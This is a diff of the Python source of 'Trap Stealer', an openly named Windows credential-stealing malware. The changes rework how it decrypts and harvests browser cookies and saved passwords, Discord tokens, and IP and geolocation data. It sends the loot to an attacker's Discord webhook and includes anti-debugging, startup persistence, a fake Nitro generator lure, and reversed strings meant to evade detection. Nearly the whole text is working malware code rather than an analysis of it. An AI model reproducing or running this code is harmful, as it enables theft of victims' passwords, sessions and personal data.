@@ -21,16 +21,15 @@ import shutil, json, sqlite3
 import tempfile, datetime
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 
-### CONFIG ### 
-webhook = '%Webhook%' #Put your webhook
+webhook = '%Webhook%' 
 
-FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
-Fakegen = '%FakeGen%' # If True, starts a fake Discord nitro generator
-injection = '%Injection%' # If True, injects into Discord
-Startup = '%Startup%' # If True, adds the file to the startup folder
-antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
-DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
-StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
+FakeWebhook = '%FakeWebhook%'
+Fakegen = '%FakeGen%' 
+injection = '%Injection%' 
+Startup = '%Startup%' 
+antidebugging = '%No_Debug%' 
+DiscordStop = '%Close%' 
+StartupMessage = 'Error while adding Trap into the startup folder' 
 
 requirements = [
     ["requests", "requests"],
@@ -373,6 +372,7 @@ def systemInfo():
 
     return sys_info
 
+
 def globalInfo():
     
     url = 'nosj/oi.ofnipi//:sptth'
@@ -391,7 +391,6 @@ def globalInfo():
     postal = data['postal']
     computer_name = socket.gethostname()
     cores = os.cpu_count()
-    gpu = 'None'
     if platform.system() == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
@@ -406,6 +405,7 @@ def globalInfo():
             gpu = f"GPU Model: {gpu_model}\nTotal Memory: {total_memory} MB\nFree Memory: {free_memory} MB\nUsed Memory: {used_memory} MB\nGPU Temperature: {temperature}°C"
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
+
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
@@ -1218,9 +1218,31 @@ def paaz():
         global PasswCount
         file = os.getenv("TEMP") + f"\wppassw.txt"
         filename = "wppassw.txt"
+        file2 = os.getenv("TEMP") + f"\wpcook.txt"
+        filename2 = "wpcook.txt"
+        with open(file, 'r') as fp:
+            lines = sum(1 for line in fp)
+        def upload_and_assign_variable(file_path, variable):
+            try:
+                result = upload_file(file_path)
+                variable.append(result) 
+            except Exception as e:
+                pass
 
-        a = upload_file(file)
-        embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
+        results = []
+
+        thread1 = threading.Thread(target=upload_and_assign_variable, args=(file, results))
+        thread2 = threading.Thread(target=upload_and_assign_variable, args=(file2, results))
+
+        thread1.start()
+        thread2.start()
+
+        thread1.join()
+        thread2.join()
+
+        a = results[0] if results else None
+        b = results[1] if len(results) > 1 else None
+
         pas = 'drowssaP'
         data = {
             "username": "Trap Stealer",
@@ -1228,10 +1250,13 @@ def paaz():
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
             "embeds": [
                 {
-                    "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of {pas[::-1]} : {PasswCount}",
+                    "title": f"🍪 Trap Stealer {pas[::-1]} and cookies",
+                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {lines}",
                     "color": 0xffb6c1,
-                    "fields": embed_fields,
+                    "fields": [
+                        {"name": f"{filename}", "value": f"[Click here to download]({a})"},
+                        {"name": f"{filename2}", "value": f"[Click here to download]({b})"}  
+                    ],
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                     },
@@ -1243,102 +1268,47 @@ def paaz():
             ]
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:pass
+    except:
+        pass
+cl = 0
 
-def paaaz():
+Cookies = []
+def getCook(path, arg):
     try:
-        file = os.getenv("TEMP") + f"\wpcook.txt"
-        filename = "wpcook.txt"
-        with open(file, 'r') as fp:
-            lines = len(fp.readlines())
+        global Cookies, CookiCount
+        if not os.path.exists(path): return
+        e = 'seikooC/'
+        pathC = path + arg + e[::-1]
+        if os.stat(pathC).st_size == 0: return
+
+        tempfold = (f"{temp}wp"+ ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))+ ".db"
+        )
+
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        data = cursor.fetchall()
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+
+        pathKey = f"{path}/Local State"
+
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+        master_key = CryptUnprotectData(master_key[5:])
+  
+        for row in data: 
             
-            
-        a = upload_file(file)
-        embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
-        pas = 'eikooC'
-        data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of {pas[::-1]} : {lines}",
-                    "color": 0xffb6c1,
-                    "fields": embed_fields,
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                    }
-                }
-            ]
-        }
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+            if row[0] != '':
+                cl =+ 1
+                
+                Cookies.append(f"Host Key: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
+        writeforfile(Cookies, 'cook')
+        
+        
     except:pass
-
-def getcook():
-    global coonum
-
-    def _z1v7s1(path):
-        if not os.path.exists(path):return 
-        with open(path,"r",encoding="utf-8") as f:local_state=json.load(f)
-        master_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        master_key=CryptUnprotectData(master_key,None,None,None,0)[1]
-        return master_key
-
-    def _x2a6f6(buff,master_key):
-        iv=buff[3:15]
-        payload=buff[15:]
-        cipher=AES.new(master_key,AES.MODE_GCM,iv)
-        decrypted_pass=cipher.decrypt(payload)
-        decrypted_pass=decrypted_pass[:-16].decode()
-        return decrypted_pass
-
-
-    global coonum
-
-    appdata=os.getenv('LOCALAPPDATA')
-    browsers={'google-chrome':appdata+'\\Google\\Chrome\\User Data','microsoft-edge':appdata+'\\Microsoft\\Edge\\User Data'}
-    profiles=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5']
-    n = 0
-    cookies=[]
-    for path in browsers.values():
-        try:
-            if not os.path.exists(path):continue
-            master_key=_z1v7s1(f'{path}\\Local State')
-            if not master_key:continue
-            for profile in profiles:
-                cookie_db = f'{path}\\{profile}\\Network\\Cookies'
-                if not os.path.exists(cookie_db):
-                    continue
-                path2 = os.getenv("TEMP") + f"\wpcook.txt"
-                try:
-                    conn = sqlite3.connect(cookie_db)
-                    cursor = conn.cursor()
-                    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
-                    for row in cursor.fetchall():
-                        coonum += 1
-                        if all(row[:4]):
-                            cookie = _x2a6f6(row[3], master_key)
-                            cookies.append({'host': row[0], 'name': row[1], 'path': row[2], 'value': cookie, 'expires': row[4]})
-                    conn.close()
-                    
-                    with open(path2, mode='w', encoding='utf-8') as f:
-                        f.write("Trap Stealer\n")
-                        for cookie_entry in cookies:
-                            n +=1
-                            f.write(str(cookie_entry) + "\n")
-                except Exception as e:
-                    pass
-                except:
-                    conn.close()
-                    pass
-        except:
-            pass
-            
 
             
 def GatherZips(paths1, paths2, paths3):
@@ -1434,6 +1404,25 @@ def GatherAll():
     global injection
     global DiscordStop
     
+    for patt in browserPaths:
+        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
+        tokq.start()
+        aa.append(tokq)
+    for patt in discordPaths:
+        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        di.start()
+        aa.append(di)
+    for patt in browserPaths:
+        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        pa.start()
+        aa.append(pa)
+    coc = []
+    for patt in browserPaths: 
+        a = threading.Thread(target=getCook, args=[patt[0], patt[4]])
+        a.start()
+        coc.append(a)
+
+    for thread in coc: thread.join()
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
@@ -1462,7 +1451,15 @@ def GatherAll():
             pass
     except:
         pass
-
+    
+    for thread in aa:
+        thread.join()
+        
+    e = []
+    a = threading.Thread(target=paaz)
+    a.start()
+    e.append(a)
+    
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
@@ -1473,64 +1470,39 @@ def GatherAll():
         wb = threading.Thread(target=webhook_tools)
         wb.start()
         aa.append(wb)
-    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
-    
-    az = threading.Thread(target=upload_files_to_discord)
-    az.start()
-    Threadlist.append(az)
+        
+    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
 
     a = threading.Thread(target=getinfo)
     a.start()
-    Threadlist.append(a)
-    threadlist2 = []
+    aa.append(a)
+    aa = []
     
-    hist = threading.Thread(target=histup)
-    hist.start()
-    threadlist2.append(hist)
-
-    coo = threading.Thread(target=getcook)
-    coo.start()
-    threadlist2.append(coo)
-
-    for patt in browserPaths:
-        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
-        tokq.start()
-        Threadlist.append(tokq)
-    for patt in discordPaths:
-        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        di.start()
-        Threadlist.append(di)
-    for patt in browserPaths:
-        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
-        pa.start()
-        threadlist2.append(pa)
+    for thread in aa:
+        thread.join()
+    
         
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
-        threadlist2.append(sta)
+        aa.append(sta)
     else:
         pass
     
-    
-    for thread in threadlist2:
-        thread.join()
-    paz = threading.Thread(target=paaz)
-    paz.start()
-    Threadlist.append(paz)
+
+    hist = threading.Thread(target=histup)
+    hist.start()
+    aa.append(hist)
     
     scr = threading.Thread(target=srcs)
     scr.start()
-    Threadlist.append(scr)
+    aa.append(scr)
     
-    paz = threading.Thread(target=paaaz)
-    paz.start()
-    Threadlist.append(paz)
+    az = threading.Thread(target=upload_files_to_discord)
+    az.start()
+    aa.append(az)
     
-    for thread in Threadlist:
-        thread.join()
     for thread in aa:
-        thread.join() 
+        thread.join()
         
-
 GatherAll() 
